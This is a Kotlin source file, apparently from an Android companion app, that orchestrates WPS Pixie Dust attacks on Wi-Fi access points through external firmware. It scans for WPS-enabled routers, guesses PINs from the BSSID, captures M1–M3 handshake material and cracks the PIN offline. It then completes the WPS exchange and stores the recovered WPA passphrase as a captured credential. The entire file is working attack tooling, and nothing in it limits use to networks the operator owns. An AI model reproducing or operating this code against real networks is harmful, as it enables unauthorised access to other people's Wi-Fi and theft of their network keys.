package com.swp81x.nrsuite

import com.swp81x.nrsuite.core.credentials.CapturedCredential
import com.swp81x.nrsuite.core.credentials.CredentialSession
import com.swp81x.nrsuite.core.credentials.CredentialSource
import com.swp81x.nrsuite.core.credentials.CredentialStatus
import com.swp81x.nrsuite.core.log.LogLevel
import com.swp81x.nrsuite.core.wifi.NetworkTarget
import com.swp81x.nrsuite.core.wps.WpsPinAttemptResult
import com.swp81x.nrsuite.core.wps.WpsPinGenerator
import com.swp81x.nrsuite.core.wps.WpsPinRecord
import com.swp81x.nrsuite.core.wps.WpsPinSource
import com.swp81x.nrsuite.core.wps.WpsPixieCapturedMaterial
import com.swp81x.nrsuite.core.wps.WpsPixieCracker
import com.swp81x.nrsuite.core.wps.WpsPixieMaterial
import java.util.UUID
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.launch
import kotlinx.coroutines.runInterruptible
import org.json.JSONObject

private const val WPS_PIXIE_M1_FALLBACK_TIMEOUT_MS = 15_000L
private const val WPS_PIXIE_PREPARE_FALLBACK_TIMEOUT_MS = 15_000L

data class WpsPixieLiveLogEntry(
    val time: String,
    val message: String,
)

data class WpsPixieLiveUiState(
    val scanning: Boolean = false,
    val targets: List<NetworkTarget> = emptyList(),
    val wpsOnly: Boolean = true,
    val selectedTarget: NetworkTarget? = null,
    val candidatePin: String = "",
    val candidateSource: WpsPinSource? = null,
    val running: Boolean = false,
    val runId: String? = null,
    val stage: String = "",
    val message: String = "",
    val material: WpsPixieCapturedMaterial? = null,
    val firstHalfValid: Boolean? = null,
    val recoveredPin: String? = null,
    val psk: String? = null,
    val error: String? = null,
    val locked: Boolean = false,
    val autoRetryUsed: Boolean = false,
    val retryCountdownSeconds: Int? = null,
    val progressLog: List<WpsPixieLiveLogEntry> = emptyList(),
)

internal fun MainViewModel.logWpsPixieLive(message: String) {
    val time = java.time.LocalTime.now()
        .format(java.time.format.DateTimeFormatter.ofPattern("HH:mm:ss"))
    _wpsPixieLive.update { state ->
        if (state.progressLog.lastOrNull()?.message == message) {
            state
        } else {
            state.copy(
                progressLog = (state.progressLog + WpsPixieLiveLogEntry(time, message)).takeLast(250),
            )
        }
    }
}

internal fun MainViewModel.setWpsOnlyFilterImpl(enabled: Boolean) {
    if (_wpsPixieLive.value.running) return
    _wpsPixieLive.update { it.copy(wpsOnly = enabled) }
}

internal fun MainViewModel.scanWpsTargetsImpl() {
    val activeSession = session
    if (activeSession == null) {
        appendLog("WPS Pixie: connect to a device before scanning.", level = LogLevel.ERROR)
        return
    }
    if (_wpsPixieLive.value.scanning || _wpsPixieLive.value.running) return
    wpsTargetScanJob?.cancel()
    wifiScanDestination = WifiScanDestination.WPS
    _wpsPixieLive.update {
        it.copy(
            scanning = true,
            targets = emptyList(),
            selectedTarget = null,
            material = null,
            firstHalfValid = null,
            recoveredPin = null,
            psk = null,
            error = null,
            stage = "",
            progressLog = emptyList(),
        )
    }
    logWpsPixieLive("Scanning for WPS-enabled access points...")
    wpsTargetScanJob = scope.launch {
        try {
            val response = runCatching {
                activeSession.sendCommand(
                    "WPS_LOCK_SCAN",
                    JSONObject().apply {
                        put("band", "auto")
                        put("dwell_ms", 120)
                    },
                    timeoutMs = 45_000,
                )
            }.getOrNull()
            val count = response?.optInt("count", _wpsPixieLive.value.targets.size) ?: 0
            if (response?.optBoolean("ok") == true) {
                logWpsPixieLive("Scan complete: $count WPS target(s).")
                appendLog("WPS Pixie: WPS scan complete ($count targets).")
            } else {
                val message = response?.optString("error")?.takeIf { it.isNotBlank() }
                    ?: response?.optString("msg")?.takeIf { it.isNotBlank() }
                    ?: "scan timed out"
                _wpsPixieLive.update { it.copy(error = message) }
                logWpsPixieLive("Scan failed: $message")
                appendLog("WPS Pixie: WPS scan failed: $message", level = LogLevel.ERROR)
            }
        } finally {
            if (wifiScanDestination == WifiScanDestination.WPS) {
                wifiScanDestination = null
            }
            _wpsPixieLive.update { it.copy(scanning = false) }
            wpsTargetScanJob = null
        }
    }
}

internal fun MainViewModel.observeWpsScanTargetImpl(target: NetworkTarget) {
    // Keep every scanned AP in the live module so the WPS-only toggle can be
    // switched off. Open/none security is explicitly treated as non-WPS even
    // if a surprising scan result sets the WPS flag.
    val openNetwork = target.security.equals("OPEN", ignoreCase = true) ||
        target.security.equals("NONE", ignoreCase = true)
    val normalized = target.copy(wps = target.wps && !openNetwork)
    _wpsPixieLive.update { state ->
        state.copy(
            targets = (state.targets.filterNot {
                it.bssid.equals(normalized.bssid, ignoreCase = true)
            } + normalized).sortedByDescending { it.rssi },
        )
    }
    if (normalized.wps) {
        logWpsPixieLive(
            "WPS target: ${normalized.ssid.ifBlank { "(hidden)" }} (${normalized.bssid})",
        )
    }
}

internal fun MainViewModel.observeWpsLockScanTargetImpl(ap: com.swp81x.nrsuite.core.wps.WpsLockAccessPoint) {
    val target = NetworkTarget(
        ssid = ap.ssid,
        bssid = ap.bssid,
        channel = ap.channel,
        rssi = ap.rssi,
        security = ap.security,
        wps = true,
        vendor = ap.vendor,
        ouiWhitelisted = ap.ouiWhitelisted,
        ouiBlacklisted = ap.ouiBlacklisted,
        wpsLockState = ap.lockState,
    )
    _wpsPixieLive.update { state ->
        state.copy(
            targets = (state.targets.filterNot {
                it.bssid.equals(ap.bssid, ignoreCase = true)
            } + target).sortedByDescending { it.rssi },
        )
    }
    logWpsPixieLive(
        "WPS target: ${ap.ssid.ifBlank { "(hidden)" }} (${ap.bssid}) · ${ap.lockState.name.lowercase().replace('_', ' ')}",
    )
}

internal fun MainViewModel.selectWpsTargetImpl(target: NetworkTarget) {
    if (_wpsPixieLive.value.running) return
    if (!target.wps) {
        logWpsPixieLive("Ignoring non-WPS target ${target.bssid}.")
        return
    }
    val stored = _wpsPins.value.firstOrNull {
        it.bssid.equals(target.bssid, ignoreCase = true) && it.lastResult != WpsPinAttemptResult.LOCKED
    }
    val generated = WpsPinGenerator.getLikely(target.bssid)
    val candidatePin = stored?.pin ?: generated ?: "12345670"
    val source = when {
        stored != null && stored.verified -> WpsPinSource.STORED
        stored != null -> stored.source
        generated != null -> WpsPinSource.GENERATED
        else -> WpsPinSource.GENERATED
    }
    _wpsPixieLive.update {
        it.copy(
            selectedTarget = target,
            candidatePin = candidatePin,
            candidateSource = source,
            material = null,
            firstHalfValid = null,
            recoveredPin = null,
            psk = null,
            error = null,
            locked = false,
            stage = "",
            message = if (stored != null) "Loaded stored PIN for this BSSID." else {
                if (generated != null) "Generated likely PIN from BSSID OUI." else "Using fallback PIN 12345670."
            },
            autoRetryUsed = false,
            progressLog = emptyList(),
        )
    }
    logWpsPixieLive("Selected ${target.ssid.ifBlank { "(hidden)" }}.")
    logWpsPixieLive("Candidate PIN $candidatePin from ${source.name.lowercase()}.")
}

internal fun MainViewModel.startWpsPixieLiveAttemptImpl(
    pinOverride: String? = null,
    sourceOverride: WpsPinSource? = null,
    reuseMac: Boolean = false,
) {
    val activeSession = session
    val state = _wpsPixieLive.value
    val target = state.selectedTarget
    if (activeSession == null) {
        _wpsPixieLive.update { it.copy(error = "Connect to a device first.") }
        return
    }
    if (target == null) {
        _wpsPixieLive.update { it.copy(error = "Select a WPS target first.") }
        return
    }
    if (state.running) return
    val pin = pinOverride ?: state.candidatePin
    val source = sourceOverride ?: state.candidateSource ?: WpsPinSource.MANUAL
    val automaticRetry = pinOverride != null
    // Generated/fallback PINs are unverified guesses. Capture M3 only and let
    // the offline search decide the PIN instead of consuming a wrong-PIN M4
    // validation. Stored/manual/recovered PINs still use the full M4-M8 path.
    val captureOnly = !automaticRetry && source == WpsPinSource.GENERATED
    if (pin.length != 8 && pin.length != 4) {
        _wpsPixieLive.update { it.copy(error = "PIN must be 4 or 8 digits.") }
        return
    }
    val runId = UUID.randomUUID().toString()
    wpsPixiePrepareWatchdogJob?.cancel()
    wpsPixiePrepareWatchdogJob = null
    wpsPixieM1WatchdogJob?.cancel()
    wpsPixieM1WatchdogJob = null
    logWpsPixieLive("Starting WPS attempt with PIN $pin (${source.name.lowercase()}).")
    _wpsPixieLive.update {
        it.copy(
            running = true,
            runId = runId,
            candidatePin = pin,
            candidateSource = source,
            stage = "starting",
            message = "Sending WPS attempt to firmware...",
            error = null,
            locked = false,
            psk = null,
            material = if (automaticRetry) it.material else null,
            firstHalfValid = null,
            recoveredPin = if (automaticRetry) it.recoveredPin else null,
            autoRetryUsed = if (automaticRetry) it.autoRetryUsed else false,
            retryCountdownSeconds = null,
        )
    }
    scope.launch {
        val args = JSONObject().apply {
            put("bssid", target.bssid)
            put("ssid", target.ssid)
            put("channel", target.channel)
            put("band", if (target.channel <= 14) "2g" else "5g")
            put("pin", pin)
            put("pin_source", source.name.lowercase())
            put("capture_only", captureOnly)
            put("reuse_mac", reuseMac)
            put("run_id", runId)
        }
        val response = runCatching {
            activeSession.sendCommand("WPS_PIXIE_ATTEMPT", args, timeoutMs = 12_000)
        }.getOrNull()
        if (response?.optBoolean("ok") != true) {
            val code = response?.optString("error").orEmpty().ifBlank {
                response?.optString("msg").orEmpty()
            }
            val message = when (code) {
                "softap_start_failed" -> "Firmware could not start the hidden WPS helper SoftAP."
                "apsta_failed" -> "Firmware could not enable Wi-Fi AP+STA mode."
                "set_channel_failed" -> "Firmware could not tune to the target channel."
                "wps_pixie_not_supported" -> "This firmware build does not support WPS Pixie Dust."
                "wps_pixie_busy" -> "A WPS Pixie attempt is already running."
                "" -> "No command response from firmware."
                else -> code
            }
            _wpsPixieLive.update { it.copy(running = false, error = message, stage = "error") }
            appendLog("WPS Pixie attempt failed to start: $message", level = LogLevel.ERROR)
        }
    }
}

internal fun MainViewModel.stopWpsPixieLiveAttemptImpl() {
    val activeSession = session
    val runId = _wpsPixieLive.value.runId
    wpsPixiePrepareWatchdogJob?.cancel()
    wpsPixiePrepareWatchdogJob = null
    wpsPixieM1WatchdogJob?.cancel()
    wpsPixieM1WatchdogJob = null
    wpsPixieLiveJob?.cancel()
    wpsPixieLiveJob = null
    _wpsPixieLive.update {
        it.copy(
            running = false,
            stage = "stopped",
            message = "Stopping WPS attempt...",
            retryCountdownSeconds = null,
        )
    }
    if (activeSession != null) {
        scope.launch {
            runCatching {
                activeSession.sendCommand(
                    "WPS_PIXIE_STOP",
                    JSONObject().put("run_id", runId.orEmpty()),
                    timeoutMs = 5_000,
                )
            }
        }
    }
}

/** Called from MainViewModel's central bridge event collector. */
internal fun MainViewModel.handleWpsPixieLiveEventImpl(event: JSONObject) {
    val stateRunId = _wpsPixieLive.value.runId
    val eventRunId = event.optString("run_id")
    if (stateRunId != null && eventRunId.isNotBlank() && eventRunId != stateRunId) {
        return
    }
    when (event.optString("type")) {
        "wps_pixie_progress" -> {
            val stage = event.optString("stage")
            val message = event.optString("message")
            val terminalStage = stage == "complete" || stage == "stopped"
            _wpsPixieLive.update {
                it.copy(
                    // Progress events update presentation only. The operation
                    // lifecycle handlers below are the single owner of `running`.
                    running = if (terminalStage) false else it.running,
                    stage = stage,
                    message = message,
                )
            }
            if (stage == "prepare") {
                armWpsPixiePrepareWatchdog(_wpsPixieLive.value.runId)
            } else {
                wpsPixiePrepareWatchdogJob?.cancel()
                wpsPixiePrepareWatchdogJob = null
            }
            if (stage == "identity" && message.contains("Associated", ignoreCase = true)) {
                armWpsPixieM1Watchdog(_wpsPixieLive.value.runId)
            } else if (stage in setOf(
                    "m1", "m2", "m3", "m4", "m5", "m6", "m7", "m8",
                    "wrong-pin", "complete", "stopped",
                )
            ) {
                wpsPixieM1WatchdogJob?.cancel()
                wpsPixieM1WatchdogJob = null
            }
            logWpsPixieLive(
                if (message.isBlank()) stage else "$stage: $message",
            )
        }

        "wps_pixie_wrong_pin" -> {
            wpsPixiePrepareWatchdogJob?.cancel()
            wpsPixiePrepareWatchdogJob = null
            wpsPixieM1WatchdogJob?.cancel()
            wpsPixieM1WatchdogJob = null
            val material = parseWpsPixieMaterialEvent(event)
            val m3Only = event.optBoolean("m3_only", false)
            val message = if (m3Only) {
                "M3 captured; starting offline Pixie Dust crack."
            } else {
                "PIN rejected; starting offline Pixie Dust crack."
            }
            _wpsPixieLive.update {
                it.copy(
                    material = material,
                    firstHalfValid = if (event.has("first_half_valid")) {
                        event.optBoolean("first_half_valid")
                    } else {
                        null
                    },
                    stage = if (m3Only) "m3-captured" else "wrong-pin",
                    message = message,
                )
            }
            logWpsPixieLive(
                (if (m3Only) "M3 material captured." else "PIN rejected.") +
                    if (event.has("first_half_valid")) {
                        " First half ${if (event.optBoolean("first_half_valid")) "valid" else "not confirmed"}."
                    } else {
                        ""
                    },
            )
            if (material == null) {
                _wpsPixieLive.update {
                    it.copy(
                        running = false,
                        error = "Firmware did not provide complete M1/M2/M3 material.",
                    )
                }
                return
            }
            startAutomaticWpsPixieCrack(material)
        }

        "wps_pixie_psk" -> {
            wpsPixiePrepareWatchdogJob?.cancel()
            wpsPixiePrepareWatchdogJob = null
            wpsPixieM1WatchdogJob?.cancel()
            wpsPixieM1WatchdogJob = null
            val psk = event.optString("psk")
            val pin = event.optString("pin").ifBlank { _wpsPixieLive.value.candidatePin }
            val target = _wpsPixieLive.value.selectedTarget
            _wpsPixieLive.update {
                it.copy(
                    running = false,
                    stage = "complete",
                    message = "WPS PSK recovered.",
                    psk = psk,
                    recoveredPin = pin,
                    retryCountdownSeconds = null,
                    error = null,
                )
            }
            if (target != null && psk.isNotBlank()) {
                logWpsPixieLive("PSK recovered and saved for ${target.ssid}.")
                saveWpsPixieSuccessImpl(target, pin, psk)
            }
        }

        "wps_pixie_error" -> {
            wpsPixiePrepareWatchdogJob?.cancel()
            wpsPixiePrepareWatchdogJob = null
            wpsPixieM1WatchdogJob?.cancel()
            wpsPixieM1WatchdogJob = null
            val code = event.optString("code")
            val stopped = code == "stopped"
            val locked = code == "wps_locked" || code == "m2d" || code == "nack_before_m3"
            val message = event.optString("message").ifBlank {
                if (locked) "AP may be WPS locked. Wait before retrying." else "WPS attempt failed."
            }
            val current = _wpsPixieLive.value
            if (stopped && (!current.running || current.stage == "stopped" || current.error != null)) {
                return
            }
            _wpsPixieLive.update {
                it.copy(
                    running = false,
                    stage = if (stopped) "stopped" else "error",
                    message = message,
                    error = if (stopped) null else message,
                    locked = locked,
                    retryCountdownSeconds = null,
                )
            }
            if (!stopped) {
                logWpsPixieLive("ERROR: $message")
                appendLog("WPS Pixie: $message", level = LogLevel.ERROR)
            } else {
                logWpsPixieLive(message)
            }
        }
    }
}

private fun MainViewModel.startAutomaticWpsPixieCrack(material: WpsPixieCapturedMaterial) {
    val target = _wpsPixieLive.value.selectedTarget ?: return
    val state = _wpsPixieLive.value
    if (state.autoRetryUsed) {
        _wpsPixieLive.update {
            it.copy(
                running = false,
                error = "Recovered PIN also failed. Stop and check for WPS lockout.",
            )
        }
        return
    }
    wpsPixiePrepareWatchdogJob?.cancel()
    wpsPixiePrepareWatchdogJob = null
    wpsPixieM1WatchdogJob?.cancel()
    wpsPixieM1WatchdogJob = null
    logWpsPixieLive("Starting offline Pixie Dust PIN search.")
    appendLog("WPS Pixie: starting offline PIN search.")
    _wpsPixieLive.update { it.copy(running = true, autoRetryUsed = true, stage = "cracking") }
    wpsPixieLiveJob?.cancel()
    wpsPixieLiveJob = scope.launch(Dispatchers.Default) {
        try {
            var lastLoggedPhase: WpsPixieCracker.Progress.Phase? = null
            val recovered = runInterruptible {
                WpsPixieCracker.crack(
                    material = mainThreadMaterialWithAuthKey(material),
                    shouldStop = { Thread.currentThread().isInterrupted },
                    onProgress = { progress ->
                        if (lastLoggedPhase != progress.phase) {
                            lastLoggedPhase = progress.phase
                            logWpsPixieLive("Offline crack: ${progress.phase.label}.")
                        }
                        _wpsPixieLive.update {
                            it.copy(
                                message = "${progress.phase.label}: ${progress.tested}/${progress.total}",
                            )
                        }
                    },
                )
            }
            if (recovered == null) {
                appendLog("WPS Pixie: offline PIN search found no match.", level = LogLevel.ERROR)
                _wpsPixieLive.update {
                    it.copy(
                        running = false,
                        error = "Offline Pixie Dust crack found no PIN. AP may be locked or material is invalid.",
                    )
                }
                return@launch
            }
            logWpsPixieLive("Recovered PIN ${recovered.pin}; continuing the active WPS session.")
            appendLog("WPS Pixie: recovered PIN ${recovered.pin}; continuing M4-M8 on the active session.")
            upsertWpsPinImpl(
                WpsPinRecord(
                    bssid = target.bssid,
                    ssid = target.ssid,
                    pin = recovered.pin,
                    source = WpsPinSource.PIXIE,
                    verified = false,
                    lastResult = WpsPinAttemptResult.WRONG_PIN,
                    updatedAt = timestampNow(),
                ),
            )
            _wpsPixieLive.update {
                it.copy(
                    running = true,
                    recoveredPin = recovered.pin,
                    candidatePin = recovered.pin,
                    candidateSource = WpsPinSource.PIXIE,
                    stage = "continuing",
                    retryCountdownSeconds = null,
                    message = "Sending recovered PIN into the active WPS session...",
                )
            }
            val activeSession = session
            val runId = _wpsPixieLive.value.runId
            if (activeSession == null || runId.isNullOrBlank()) {
                _wpsPixieLive.update {
                    it.copy(running = false, error = "WPS session is no longer available.")
                }
                return@launch
            }
            val response = runCatching {
                activeSession.sendCommand(
                    "WPS_PIXIE_CONTINUE",
                    JSONObject().apply {
                        put("run_id", runId)
                        put("pin", recovered.pin)
                        put("pin_source", "pixie")
                    },
                    timeoutMs = 5_000,
                )
            }.getOrNull()
            if (response?.optBoolean("ok") != true) {
                val code = response?.optString("error").orEmpty().ifBlank {
                    response?.optString("msg").orEmpty()
                }
                val message = code.ifBlank { "Firmware did not continue the active WPS session." }
                _wpsPixieLive.update {
                    it.copy(running = false, stage = "error", error = message)
                }
                appendLog("WPS Pixie: $message", level = LogLevel.ERROR)
                return@launch
            }
            logWpsPixieLive("Recovered PIN accepted by firmware; waiting for M5-M8.")
        } catch (cancelled: CancellationException) {
            throw cancelled
        } catch (error: Throwable) {
            _wpsPixieLive.update {
                it.copy(
                    running = false,
                    error = error.message ?: error.javaClass.simpleName,
                )
            }
        }
    }
}

private fun MainViewModel.mainThreadMaterialWithAuthKey(
    material: WpsPixieCapturedMaterial,
): WpsPixieMaterial {
    val authKey = wpsPixieLiveAuthKeyCache[
        material.eNonce.joinToString("") { "%02x".format(it) }
    ] ?: error("Missing AuthKey for captured material")
    return material.withAuthKey(authKey)
}

private fun MainViewModel.armWpsPixiePrepareWatchdog(runId: String?) {
    if (runId.isNullOrBlank()) return
    wpsPixiePrepareWatchdogJob?.cancel()
    wpsPixiePrepareWatchdogJob = scope.launch {
        delay(WPS_PIXIE_PREPARE_FALLBACK_TIMEOUT_MS)
        val current = _wpsPixieLive.value
        if (current.runId != runId || !current.running || current.stage != "prepare") {
            return@launch
        }
        val message = "Firmware radio setup did not respond within 15 seconds."
        _wpsPixieLive.update { state ->
            if (state.runId != runId || !state.running || state.stage != "prepare") {
                state
            } else {
                state.copy(
                    running = false,
                    stage = "start_timeout",
                    message = message,
                    error = message,
                    locked = false,
                    retryCountdownSeconds = null,
                )
            }
        }
        logWpsPixieLive("ERROR: $message")
        appendLog("WPS Pixie: $message", level = LogLevel.ERROR)
        val activeSession = session
        if (activeSession != null) {
            runCatching {
                activeSession.sendCommand(
                    "WPS_PIXIE_STOP",
                    JSONObject().put("run_id", runId),
                    timeoutMs = 5_000,
                )
            }
        }
    }
}

private fun MainViewModel.armWpsPixieM1Watchdog(runId: String?) {
    if (runId.isNullOrBlank()) return
    wpsPixieM1WatchdogJob?.cancel()
    wpsPixieM1WatchdogJob = scope.launch {
        delay(WPS_PIXIE_M1_FALLBACK_TIMEOUT_MS)
        val current = _wpsPixieLive.value
        if (current.runId != runId || !current.running || current.stage != "identity") {
            return@launch
        }
        val message = "No M1 received within 10 seconds; retry after the AP settles."
        _wpsPixieLive.update { state ->
            if (state.runId != runId || !state.running || state.stage != "identity") {
                state
            } else {
                state.copy(
                    running = false,
                    stage = "m1_timeout",
                    message = message,
                    error = message,
                    locked = false,
                    retryCountdownSeconds = null,
                )
            }
        }
        logWpsPixieLive("ERROR: $message")
        appendLog("WPS Pixie: $message", level = LogLevel.ERROR)
        val activeSession = session
        if (activeSession != null) {
            runCatching {
                activeSession.sendCommand(
                    "WPS_PIXIE_STOP",
                    JSONObject().put("run_id", runId),
                    timeoutMs = 5_000,
                )
            }
        }
    }
}

private fun MainViewModel.parseWpsPixieMaterialEvent(event: JSONObject): WpsPixieCapturedMaterial? {
    return runCatching {
        val material = WpsPixieCapturedMaterial(
            pke = WpsPixieMaterial.hexToBytes(event.optString("pke")),
            pkr = WpsPixieMaterial.hexToBytes(event.optString("pkr")),
            eNonce = WpsPixieMaterial.hexToBytes(event.optString("e_nonce")),
            rNonce = WpsPixieMaterial.hexToBytes(event.optString("r_nonce")),
            eHash1 = WpsPixieMaterial.hexToBytes(event.optString("e_hash1")),
            eHash2 = WpsPixieMaterial.hexToBytes(event.optString("e_hash2")),
            bssid = event.optString("bssid").ifBlank { null },
            ssid = event.optString("ssid").ifBlank { null },
            channel = event.optInt("channel", 0).takeIf { it > 0 },
        ).also { it.validate() }
        wpsPixieLiveAuthKeyCache[
            material.eNonce.joinToString("") { "%02x".format(it) }
        ] = WpsPixieMaterial.hexToBytes(event.optString("auth_key"))
        material
    }.getOrNull()
}

private fun MainViewModel.saveWpsPixieSuccessImpl(target: NetworkTarget, pin: String, psk: String) {
    upsertWpsPinImpl(
        WpsPinRecord(
            bssid = target.bssid,
            ssid = target.ssid,
            pin = pin,
            source = WpsPinSource.PIXIE,
            verified = true,
            lastResult = WpsPinAttemptResult.OK,
            updatedAt = timestampNow(),
        ),
    )
    val session = CredentialSession(
        id = "wps_pixie_${System.currentTimeMillis()}",
        source = CredentialSource.WPS_PIXIE,
        ssid = target.ssid.ifBlank { "(hidden)" },
        bssid = target.bssid,
        channel = target.channel,
        startedAt = timestampNow(),
        endedAt = timestampNow(),
        pcapPath = null,
        credentials = listOf(
            CapturedCredential(
                value = psk,
                capturedAt = timeHmNow(),
                status = CredentialStatus.CORRECT,
                source = CredentialSource.WPS_PIXIE,
                details = mapOf(
                    "wps_pin" to pin,
                    "security" to target.security,
                ),
            ),
        ),
    )
    synchronized(credentialLock) {
        upsertCredentialSessionLocked(session)
    }
    appendLog(
        "WPS Pixie: saved PSK for ${target.ssid} (${target.bssid}) with PIN $pin.",
        level = LogLevel.SUCCESS,
    )
}


internal fun MainViewModel.clearWpsPixieLiveLogImpl() {
    _wpsPixieLive.update { it.copy(progressLog = emptyList()) }
}

internal fun MainViewModel.resetWpsPixieLiveScreenImpl() {
    if (_wpsPixieLive.value.running) {
        stopWpsPixieLiveAttemptImpl()
    }
    wpsTargetScanJob?.cancel()
    wpsTargetScanJob = null
    if (wifiScanDestination == WifiScanDestination.WPS) {
        wifiScanDestination = null
    }
    wpsPixiePrepareWatchdogJob?.cancel()
    wpsPixiePrepareWatchdogJob = null
    wpsPixieM1WatchdogJob?.cancel()
    wpsPixieM1WatchdogJob = null
    wpsPixieLiveJob?.cancel()
    wpsPixieLiveJob = null
    wpsPixieLiveAuthKeyCache.clear()
    _wpsPixieLive.value = WpsPixieLiveUiState()
}
